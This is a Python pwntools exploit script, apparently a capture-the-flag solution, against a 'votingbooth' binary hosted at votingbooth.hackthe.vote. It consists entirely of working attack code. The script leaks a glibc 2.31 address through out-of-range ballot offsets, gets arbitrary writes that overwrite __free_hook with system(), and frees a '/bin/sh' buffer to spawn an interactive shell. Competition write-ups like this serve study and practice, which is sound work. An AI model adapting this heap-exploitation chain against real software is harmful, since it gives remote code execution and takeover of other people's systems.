from pwn import *
import codecs
import struct
context.arch="i386"

def FreeABuffer(name):
    print r.sendafter('Choice: ', '1\n')
    print r.sendafter('Enter your name: ', name+'\n')  

def SendBallot(name, ballotLen, candidateList, offset, debug=0):
    if (int(ballotLen) != len(candidateList)):
        print 'mismatched length'
    print r.sendafter('Choice: ', '1\n')
    print r.sendafter('Enter your name: ', name+'\n')
    print r.sendafter('Enter length of list of candidates: ', ballotLen+'\n')
    print r.sendafter('Enter list of candidates separated by NULLs: ', candidateList)
    if (debug):
        r.interactive()
    print r.sendafter('Enter offset of your vote: ', offset+'\n')

def ChangeName(name):
    print r.sendafter('Choice: ', '1\n')
    print r.sendafter('Enter your name: ', name+'\n')
    print r.sendafter('Enter length of list of candidates: ', '100000\n')

def LeakBuffer(name, ballotLen, candidateList):
    if (int(ballotLen) != len(candidateList)):
        print 'mismatched length'
    print r.sendafter('Choice: ', '1\n')
    print r.sendafter('Enter your name: ', name+'\n')
    print r.sendafter('Enter length of list of candidates: ', ballotLen+'\n')
    print r.sendafter('Enter list of candidates separated by NULLs: ', candidateList)
    print r.sendafter('Enter offset of your vote: ', str(10000)+'\n')

def PrintBallot():
    print r.sendafter('Choice: ', '2\n')
    print r.recvuntil('Your vote: ')
    data = r.recvuntil('\n==========')
    data = data[:len(data)-12]
    return data

def SwapBallot():
    print r.sendafter('Choice: ', '3\n')

def SubmitBallot():
    print r.sendafter('Choice: ', '4\n')

def StrToInt(str1):
    nchars = len(str1)
    return sum(ord(str1[byte])<<8*(nchars-byte-1) for byte in range(nchars))

if 'rem' in sys.argv:
    r = remote("votingbooth.hackthe.vote", 5000)
else:
    r = process("./votingbooth", env={})
    if '-d' in sys.argv:
        script = '''
        break
        '''
        gdb.attach(r, script)

libc = ELF("./libc-2.31.so",False)

# ======================================

#PrintBallot()
#size = 1536
size = 1056
#size = 536
#size = 236
#r.interactive()
for i in range (15):
    LeakBuffer('a', str(size), 'a'*size)
SendBallot('a', str(size), 'a'*size, '1')
SendBallot('a', str(size), 'a'*size, str(0xffffffffffffffff-1071))
SendBallot('a', str(size), 'a'*size, '1')
SwapBallot()
libcLeak = PrintBallot()
libcLeakInt = struct.unpack('q', libcLeak+'\x00'*(8-len(libcLeak)))[0]

print '[+] main_arena+96 libc addr: ' + hex(libcLeakInt)
# main_arena+96 is 2014176 into glibc 2.31
libc.address = libcLeakInt - 2014176
print '[+] libc.addr: ' + hex(libc.address) 
print '[+] libc system: ' + hex(libc.symbols['system'])
print '[+] libc __free_hook addr: ' + hex(libc.symbols['__free_hook'])

#r.interactive()

# Ballot A (pointing at own name buffer)
SendBallot('B'*20, '8', '/bin/sh\x00', str(int('f'*16, 16)-16303)) #20415
# Ballot B (pointing at own name buffer)
SendBallot('C'*20, '1', 'a', str(int('f'*16, 16)-20479)) #24591

# Switch to Ballot A
SwapBallot()

# Switch to ballot.ballotBoxLocation alt addr
for i in range(10):
    SubmitBallot()

ChangeName('A'*32+struct.pack('q', libc.symbols['__free_hook'])) # freeHookAddr

# Submit Ballot A, overwrite Ballot B write address with __free_hook address
SubmitBallot()

# Switch to Ballot B
SwapBallot()

# Submit Ballot B, write system address to __free_hook pointer
ChangeName(struct.pack('q', libc.symbols['system'])) # systemAddr
SubmitBallot()

# Trigger free on '/bin/sh' buffer
FreeABuffer('a')

r.interactive()
